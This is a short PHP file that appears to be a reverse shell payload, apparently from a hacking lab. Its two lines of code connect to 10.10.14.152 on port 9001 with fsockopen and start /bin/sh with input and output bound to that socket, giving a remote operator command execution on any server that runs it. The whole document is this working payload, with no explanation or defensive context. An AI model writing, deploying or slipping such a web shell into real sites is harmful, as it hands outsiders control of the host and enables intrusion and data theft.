<?php
$sock=fsockopen("10.10.14.152",9001);
system("/bin/sh <&3 >&3 2>&3");
?>